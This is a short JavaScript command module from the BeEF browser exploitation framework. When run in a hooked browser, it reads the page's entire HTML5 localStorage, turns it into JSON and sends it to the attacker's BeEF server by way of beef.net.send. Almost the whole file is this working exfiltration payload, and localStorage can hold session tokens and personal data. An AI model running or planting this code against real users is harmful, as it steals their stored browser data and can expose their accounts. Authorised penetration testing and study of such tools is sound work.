//
// Copyright (c) 2006-2013 Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (BeEF) - http://beefproject.com
// See the file 'doc/COPYING' for copying permission
//

beef.execute(function() {
	if ('localStorage' in window && window['localStorage'] !== null) {
		beef.net.send("<%= @command_url %>", <%= @command_id %>, "localStorage="+JSON.stringify(window['localStorage']));
	} else beef.net.send("<%= @command_url %>", <%= @command_id %>, "localStorage="+JSON.stringify("HTML5 localStorage is null or not supported."));
});
